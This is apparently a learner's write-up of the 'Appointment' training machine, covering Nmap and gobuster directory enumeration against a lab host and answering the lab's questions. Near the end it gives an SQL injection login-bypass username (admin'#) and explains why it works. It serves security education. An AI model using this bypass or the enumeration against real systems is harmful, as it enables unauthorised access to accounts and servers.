## Tier 1 

About : Appointment is a very easy Linux machine which showcases beginner SQL Injection techniques against an SQL database enabled web application.
Date : 16 mars 2026

## What I did

```bash
Nmap scan report for 10.129.23.125
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.16 seconds
```

HTTPS standard port : **443**

>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

We use `dir`

```bash
> gobuster
Usage:
  gobuster [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  gcs         Uses gcs bucket enumeration mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  tftp        Uses TFTP enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)
```

```bash

> gobuster dir -u http://10.129.27.188 -w SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.27.188
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.27.188/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.27.188/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.27.188/images/]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 311] [--> http://10.129.27.188/js/]
/server-status        (Status: 403) [Size: 278]
/vendor               (Status: 301) [Size: 315] [--> http://10.129.27.188/vendor/]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================

```


>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?

username : for example admin'#

the first quote escapes the string, and the # comments the rest of the query.  
## What I learned

Usage of the gobuster command and bypassing a login panel with an sql injection
